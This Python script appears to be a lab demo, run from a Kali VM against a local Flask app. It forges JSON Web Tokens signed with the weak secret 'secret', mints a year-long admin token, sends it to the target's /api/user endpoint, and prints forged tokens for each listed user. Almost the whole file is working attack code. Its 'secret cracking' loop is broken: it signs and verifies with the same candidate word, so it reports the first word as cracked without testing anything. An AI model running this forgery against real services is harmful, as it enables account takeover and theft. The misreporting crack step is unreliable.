"""
jwt_forge.py — Phase 2: JWT Token Forgery Demo
Run from Kali VM to forge admin-level JWT token using
the cracked weak secret 'secret'
"""
import jwt, datetime, sys, requests

TARGET = "http://192.168.56.1:5000"   # ← change to your host IP
SECRET = "secret"                      # Cracked weak JWT secret [V3]

print("=" * 60)
print("  JWT TOKEN FORGERY ATTACK DEMO")
print("=" * 60)

# ── Step 1: Crack the JWT secret ──────────────────────────────
wordlist = ['secret', 'password', 'mysecret', '123456', 'flask', 'jwt', 'metaverse']
print("\n[*] Attempting to crack JWT secret from wordlist...")
for word in wordlist:
    try:
        # Try to get a real JWT first from the API (if token is leaked)
        print(f"    Testing secret: '{word}'")
        test_payload = {'user_id': 1, 'username': 'alice', 'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=1)}
        test_token = jwt.encode(test_payload, word, algorithm='HS256')
        # If we can encode/decode with this secret, we found it
        jwt.decode(test_token, word, algorithms=['HS256'])
        print(f"\n[✓] JWT SECRET CRACKED: '{word}'")
        SECRET = word
        break
    except:
        pass

# ── Step 2: Forge admin JWT ───────────────────────────────────
print("\n[*] Forging admin-level JWT token...")

forged_payload = {
    'user_id':  3,                    # admin user ID (from dumped DB)
    'username': 'admin',
    'exp': datetime.datetime.utcnow() + datetime.timedelta(days=365)  # 1 year validity
}

forged_token = jwt.encode(forged_payload, SECRET, algorithm='HS256')
print(f"\n[✓] FORGED TOKEN:\n    {forged_token}")

# ── Step 3: Use forged token to access admin account ─────────
print(f"\n[*] Sending forged token to {TARGET}/api/user ...")
try:
    resp = requests.get(f"{TARGET}/api/user", params={'token': forged_token}, timeout=5)
    print(f"[✓] API RESPONSE: {resp.json()}")
    print("\n[!] SUCCESS — Admin account accessed without valid credentials!")
except Exception as e:
    print(f"[!] Could not reach target: {e}")
    print("    Make sure Phase 1 app is running and TARGET IP is correct")

# ── Step 4: Forge any user account ───────────────────────────
print("\n[*] Forging tokens for all discovered users...")
for uid, uname in [(1, 'alice'), (2, 'bob'), (3, 'admin')]:
    payload = {'user_id': uid, 'username': uname,
               'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=1)}
    token = jwt.encode(payload, SECRET, algorithm='HS256')
    print(f"    [{uname:8}] {token[:50]}...")

print("\n" + "=" * 60)
print("  IMPACT: Attacker can impersonate ANY user")
print("  → Access their assets, drain wallet, steal NFTs")
print("  → Full account takeover without knowing passwords")
print("\n  DEFENSE: Strong JWT secret (256-bit random) + short")
print("           expiry + refresh token rotation")
print("=" * 60)
